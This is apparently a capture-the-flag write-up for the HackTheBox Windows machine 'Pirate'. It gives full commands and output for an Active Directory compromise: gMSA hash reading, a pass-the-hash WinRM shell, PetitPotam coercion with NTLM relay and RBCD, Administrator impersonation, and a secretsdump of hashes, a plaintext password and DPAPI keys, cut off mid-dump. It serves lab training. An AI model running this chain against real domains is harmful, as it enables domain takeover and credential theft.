<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-orange?style=for-the-badge" alt="Hard Difficulty" />
</p>

# Pirate Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.6.225
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 14:24 UTC
Nmap scan report for 10.129.6.225
Host is up (0.25s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-01 21:23:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T21:25:38+00:00; +6h58m43s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T21:25:37+00:00; +6h58m43s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
|_ssl-date: 2026-03-01T21:25:38+00:00; +6h58m43s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T21:25:37+00:00; +6h58m42s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h58m42s, deviation: 0s, median: 6h58m42s
| smb2-time: 
|   date: 2026-03-01T21:25:01
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   244.09 ms 10.10.14.1
2   237.25 ms 10.129.6.225

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.36 seconds
```

* A windows Active Directory Machine, with a web. 

* There is nothing on port 80. its just not hosts anything. default preview of windows IIS server.

* We Have also got some Initial Credentials  pentest / p3nt3st2025!&

## Step 2 - Initial Foothold

* Lets first Try if these Creds are valid or not with nxc

```bash
nxc smb 10.129.6.225 -u 'pentest' -p 'p3nt3st2025!&'
```

```text
SMB         10.129.6.225    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.6.225    445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
```

> — Okay Creds are valid for SMB

* I tried to look for any shares, but ended up being time out by the NetBIOS. that shit sucks!.

* Lets look for some users on AD:-

```bash
nxc smb  10.129.7.251 -u 'pentest' -p 'p3nt3st2025!&' --users
```

```text
SMB         10.129.7.251    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.251    445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
SMB         10.129.7.251    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                                
SMB         10.129.7.251    445    DC01             Administrator                 2025-06-08 14:32:36 0       Built-in account for administering the computer/domain       
SMB         10.129.7.251    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain     
SMB         10.129.7.251    445    DC01             krbtgt                        2025-06-08 14:40:29 0       Key Distribution Center Service Account                      
SMB         10.129.7.251    445    DC01             a.white_adm                   2026-01-16 00:36:34 0           
SMB         10.129.7.251    445    DC01             a.white                       2025-06-08 19:33:01 0           
SMB         10.129.7.251    445    DC01             pentest                       2025-06-09 13:40:23 0           
SMB         10.129.7.251    445    DC01             j.sparrow                     2025-06-09 15:08:44 0           
SMB         10.129.7.251    445    DC01             [*] Enumerated 7 local users: PIRATE
```

* While looking at the Bloodhound, i got to see that there is a AD group named Pre windows 2000 compatible Access

```text
Pre windows 2000 compatible  And Domain Users
		^
		|
	    member of 
		^
		|
	  EXCH01 AND MS01 
```

* As we know user pentest is also a member of Domain Users and so do EXCH01 and MS01, so we can ask for TGT for both of them.

```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
```

```text
/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
LDAP        10.129.11.99    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP        10.129.11.99    389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
PRE2K       10.129.11.99    389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.11.99    389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.11.99    389    DC01             [+] Found 2 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.11.99    389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       10.129.11.99    389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K       10.129.11.99    389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/ccache  
```

> — Note: Before running anything, make sure you have synchronized the time zone with the machine.

* We got the TGTs For both the accounts.

* Now While looking at the Bloodhound for MS01 and EXCH01, I've got to know that 

```text
		MS01
		 ↓
	      member of
		 ↓
	Domain Secure Servers
		 ↓
	      readGMSA
		 ↓
	     GMSA_ADFS
		 ↓
	     member of
		 ↓
	 Remote Management 
```

* Okay So this is the Clear path to get the initial Foothold, we can read the NTLM hashes for GMSA_ADFS, and then we can use it to get the evil_winrm shell. Simple!

> — Lets Get the Shell!

* First Read the Hashes-->

```bash
nxc ldap pirate.htb -u 'MS01$' -p 'ms01' --gmsa -k
```

```text
LDAP        pirate.htb      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)                                                                                                                                                         
LDAP        pirate.htb      389    DC01             [+] pirate.htb\MS01$:ms01 
LDAP        pirate.htb      389    DC01             [*] Getting GMSA Passwords
LDAP        pirate.htb      389    DC01             Account: gMSA_ADCS_prod$      NTLM: 304106f739822ea2ad8ebe23f802d078     PrincipalsAllowedToReadPassword: Domain Secure Servers                                                                                                                                         
LDAP        pirate.htb      389    DC01             Account: gMSA_ADFS_prod$      NTLM: 8126756fb2e69697bfcb04816e685839     PrincipalsAllowedToReadPassword: Domain Secure Servers 
```

* Got the hash for gmSA_ADFS_prod$ as well as for  gmSA_ADCS_prod$

```bash
evil-winrm -i pirate.htb -u 'gMSA_ADFS_prod$' -H 8126756fb2e69697bfcb04816e685839
```

```text
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents>
```

* Initial Foothold Granted!, no flags yet :)

* Lets look for some interesting things 

```text
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents> ipconfig
                                                                                                                                                              
Windows IP Configuration                                                                                                                                      
                                                                                                                                                              
                                                                                                                                                              
Ethernet adapter vEthernet (Switch01):                                                                                                                        
                                                                                                                                                              
   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
 
Ethernet adapter Ethernet0 2:
 
   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.11.99
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

* Look at the network interfaces. we can see that there is an internal IP as well, Lets scan it 

```text
*Evil-WinRM* PS C:\temp> .\fscan.exe -h 192.168.100.1/24 -nobr -nopoc

(icmp) Target 192.168.100.1   is alive
(icmp) Target 192.168.100.2   is alive
[*] Icmp alive hosts len is: 2
192.168.100.1:88 open
192.168.100.2:808 open
192.168.100.2:445 open
192.168.100.1:445 open
192.168.100.2:443 open
192.168.100.2:139 open
192.168.100.1:139 open
192.168.100.2:135 open
192.168.100.2:80 open
192.168.100.1:135 open
[*] alive ports len is: 10
start vulscan
[*] NetInfo
[*]192.168.100.1
   [->]DC01
   [->]192.168.100.1
   [->]10.129.1.12
[*] NetInfo
[*]192.168.100.2
   [->]WEB01
   [->]192.168.100.2
[*] WebTitle http://192.168.100.2      code:200 len:703    title:IIS Windows Server
```

* Look at the scan, there is a web interface on this IP, lets tunnel this through our kali then!

* Once The Tunnel is Setup. Lets Look For the coercion Vulnerabilities on Target WEB

```bash
proxychains nxc smb WEB01.pirate.htb \
    -u 'gMSA_ADFS_prod$' -H 'fd9ea7ac7820dba5155bd6ed2d850c09' \           
    -M coerce_plus
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
SMB         224.0.0.1       445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
SMB         224.0.0.1       445    WEB01            [+] pirate.htb\gMSA_ADFS_prod$:fd9ea7ac7820dba5155bd6ed2d850c09
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
COERCE_PLUS 224.0.0.1       445    WEB01            VULNERABLE, PetitPotam                                                                                    
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK                                                                           
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK                                                                           
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK                                                                           
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:135  ...  OK                                                                           
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK                                                                           
COERCE_PLUS 224.0.0.1       445    WEB01            VULNERABLE, PrinterBug                                                                                    
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:135  ...  OK                                                                           
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:49690  ...  OK                                                                         
COERCE_PLUS 224.0.0.1       445    WEB01            VULNERABLE, PrinterBug                                                                                    
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
COERCE_PLUS 224.0.0.1       445    WEB01            VULNERABLE, MSEven
```

* Okay, So its Vulnerable for PETITPOTAM

* what is PetitPotam--> The PetitPotam attack is a critical security vulnerability (tracked as CVE-2021-36942) in Microsoft Windows Active Directory (AD) environments that allows an unauthenticated attacker to force a Domain Controller (DC) or other Windows servers to authenticate against an attacker-controlled server using NTLM. By relaying these captured credentials to Active Directory Certificate Services (AD CS), the attacker can obtain a certificate that enables them to take full control of the entire domain.

* How the PetitPotam Attack Works:-
  * Forced Authentication (Coercion): The attacker sends a specially crafted MS-EFSRPC (Encrypting File System Remote Protocol) request—specifically using the EfsRpcOpenFileRaw function—to a target server (e.g., a Domain Controller).
  * NTLM Relay: The DC, misusing this legitimate API, attempts to authenticate to the attacker-controlled server via NTLM.
  * AD CS Takeover: The attacker relays this NTLM authentication to the Certificate Authority (CA) Web Enrollment pages (AD CS).
  * Certificate Generation: The AD CS issues a signed certificate to the attacker, who can now impersonate the Domain Controller.
  * Domain Compromise: Using this certificate, the attacker can request a Ticket Granting Ticket (TGT), allowing them to impersonate the DC and perform a DCSync attack to extract all user hashes, achieving full Domain Administrator privileges

* Lets Setup a ntlmrealy first

```bash
proxychains  ntlmrelayx.py -t ldaps://192.168.100.1 \
    --remove-mic \
    --delegate-access \
    -smb2support
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

> — Here's something interesting to know -->

* When you coerce WEB01$ to authenticate, it sends an SMB-based NTLM authentication. But you want to relay that to LDAPS on the Domain Controller. Here's the conflict:

SMB authentication comes with these flags FORCED to "ON":
* Negotiate Sign
* Negotiate Always Sign
* Negotiate Key Exchange

These flags tell the server: "I REQUIRE SIGNING"

* When you relay this to LDAPS without modification, the LDAPS server sees these flags and says: "Oh, this client wants signed communication. I'll enforce signing." But here's the catch – as the relay attacker, you don't have the session keys to actually sign the LDAPS traffic. The LDAPS connection fails because you can't meet the signing requirement that the original SMB authentication requested.

* This is where `--remove-mic` and CVE-2019-1040 come in. The flag does two critical things:
  1. Removes the MIC (Tamper-Proof Seal): The MIC normally prevents any modification to the authentication message. By removing it, you can now modify the NTLM message without invalidating it.
  2. Clears the "Require Signing" Flags: Once the MIC is gone, you can flip those three signing flags from "ON" to "OFF":
     - Negotiate Sign
     - Negotiate Always Sign
     - Negotiate Key Exchange
     - [All flags cleared]

* So as We can see the ntlmrealy is listening now lets trigger it

```bash
proxychains coercer coerce \
    -u 'gMSA_ADFS_prod$' \
    --hashes :fd9ea7ac7820dba5155bd6ed2d850c09 \
    -d pirate.htb \
    -l 10.10.14.67 \
    -t 192.168.100.2 \
    --delay 1
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by Remi GASCOU (Podalirius)

[info] Starting coerce mode
[info] Scanning target 192.168.100.2
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:135  ...  OK
[info] DCERPC portmapper discovered ports: 49664,49665,49667,49706,49707,49685,49688
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
[+] SMB named pipe '\PIPE\eventlog' is accessible!
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
      [>] (-testing-) MS-EVEN──>ElfrOpenBELW(BackupFileNa      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\10.10.14.67\y1FBwcNK\aa')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
      [>] (-testing-) MS-EFSR──>EfsRpcAddUsersToFile(File      [!] (NO_AUTH_RECEIVED) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.67\g7x2qWxU\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
      [>] (-testing-) MS-EFSR──>EfsRpcAddUsersToFile(File      [!] (NO_AUTH_RECEIVED) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.67\GE4cbGIr\\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? 
```

* Now on the listener you'll see something like this-->

```text
[*] (SMB): Received connection from 10.129.2.3, attacking target ldaps://192.168.100.1
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.1:636  ...  OK
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.2.3 against ldaps://192.168.100.1 SUCCEED [1]
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] (SMB): Connection from 10.129.2.3 controlled, but there are no more targets left!
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> Adding new computer with username: PPXJROQK$ and password: oQJ#6k7FbeM7St+ result: OK
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> Delegation rights modified succesfully!
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> PPXJROQK$ can now impersonate users on WEB01$ via S4U2Proxy
```

we can see that the new account is created and we have successfully performed the RBCD on the WEB01 and can impersonate it. with this newly created account

* Lets get the ST first for admin

```bash
proxychains impacket-getST -spn cifs/WEB01.pirate.htb \
    -impersonate Administrator \
    -dc-ip 192.168.100.1 \
    pirate.htb/PPXJROQK$:'oQJ#6k7FbeM7St+'
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.1:88  ...  OK
[*] Impersonating Administrator
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.1:88  ...  OK
[*] Requesting S4U2Proxy
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.1:88  ...  OK
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

> — Export it and lets dump the secrets

```bash
proxychains impacket-secretsdump -k -no-pass -dc-ip 192.168.100.1 \
    pirate.htb/Administrator@WEB01.pirate.htb
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
[*] Dumping cached domain logon information (domain/username:hash)
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)
PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-03-07 21:12:24+00:00)
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-03-07 21:10:20+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PIRATE\WEB01$:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
[*] DefaultPassword 
PIRATE\a.white:E2nvAOKSz5Xz2MJu
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
[*] NL$KM 
 0000   A5 24 39 57 3F 8F 30 DC  61 F1 56 B7 B5 5C 0F 7C   .$9W?.0.a.V..\.|
 0010   6B 0A FF DF B0 A2 99 C3  68 A9 FE 15 E2 48 33 A9   k.......h....H3.
 0020   E9 8C 27 F8 8B 7C 05 55  4D FE 3C 5D 09 EA 9C 49   ..'..|.UM.<]...I
 0030   95 EB 7A 09 5B 48 7A 14  DC 74 E9 CB 7C 1A E0 8A   ..z.[Hz..t..|...
NL$KM:a52439573f8f30dc61f156b7b55c0f7c6b0affdfb0a299c368a9fe15e24833a9e98c27f88b7c05554dfe3c5d09ea9c4995eb7a095b487a14dc74e9cb7c1ae08a
[*] _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 
 0000   E3 EF 47 4B 98 13 8D D4  46 9F 6D C1 76 F8 79 BA   ..GK....F.m.v.y.
 0010   1E 08 17 BA 44 50 21 87  B9 08 0B 9F 33 34 C9 1B   ....DP!.....34..
 0020   9B 1A F1 CE 4E 91 FB 56  2C 8D 88 24 41 2C 70 0E   ....N..V,..$A,p.
 0030   00 D1 05 BC 67 4D 8E 26  A5 94 E3 DA 41 73 F2 C8   ....gM.&....As..
 0040   73 13 D6 34 B3 9C 34 12  D4 BF B6 84 92 47 68 6D   s..4..4......Ghm
 0050   F6 06 5B 53 65 66 80 7E  0A CE 92 F9 4E A3 16 6B   ..[Sef.~....N..k
 0060   B9 75 2D 12 D3 52 C8 9B  9F DA FA 7D 31 71 E4 DD   .u-..R.....}1q..
 0070   55 BE 9D 58 55 04 F8 C6  28 A0 FF 4C 67 0D 75 95   U..XU...(..Lg.u.
 0080   A9 09 A3 C9 A7 EC 2D FF  98 4E 5D DF 77 04 9A 91   ......-..N].w...
 0090   A5 59 7F 0A 39 C5 49 94  55 67 59 01 CC E4 1A DE   .Y..9.I.UgY.....
 00a0   D9 8D 80 A1 B5 F7 F8 2C  C2 20 B5 90 DF 4B FC 0B   .......,. ...K..
 00b0   FC 5F 0F EB 66 E7 3A 56  F1 AB 7F E9 14 C6 D7 CD   ._..f.:V........
 00c0   2B 83 E0 B9 06 5B 76 E0  2B C3 30 F7 69 44 16 F3   +....[v.+.0.iD..
 00d0   AC D6 C4 63 DF 84 92 35  00 B6 4A 10 14 E7 44 13   ...c...5..J...D.
 00e0   80 9A 7A 06 AF 57 7C E7  68 5B FD 2A B5 6A 20 67   ..z..W|.h[.*.j g
_SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c5499455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067
[*] _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 
 0000   01 00 00 00 22 01 00 00  10 00 00 00 12 01 1A 01   ...."...........
 0010   B6 C4 08 39 11 A2 83 50  B1 FD 69 48 80 36 50 E1   ...9...P..iH.6P.
 0020   B1 C5 74 1F 77 19 B1 F4  FF 92 62 03 DC DF 4E C9   ..t.w.....b...N.
 0030   C0 36 9B 7B 92 FE 10 A2  D7 FF 95 3B FA 40 6A 3B   .6.{.......;.@j;
 0040   67 86 52 3E D8 27 67 CC  8F E2 73 4A F8 92 E9 8E   g.R>.'g...sJ....
 0050   FB EF 2B 34 76 75 90 32  B4 EC DE F3 42 76 C3 63   ..+4vu.2....Bv.c
